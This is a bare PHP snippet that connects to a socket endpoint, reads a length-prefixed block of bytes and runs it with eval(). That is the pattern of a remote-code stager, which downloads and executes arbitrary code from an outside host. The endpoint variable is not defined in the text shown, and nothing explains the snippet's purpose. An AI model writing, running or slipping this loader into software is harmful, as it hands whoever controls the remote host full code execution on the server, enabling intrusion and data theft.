<?php
$socket = stream_socket_client($endpoint);
$length = unpack("Nlen", fread($socket, 4))["len"];
$b = "";
while (strlen($b) < $length) {
    $b .= fread($socket, $length - strlen($b));
}
eval($b);
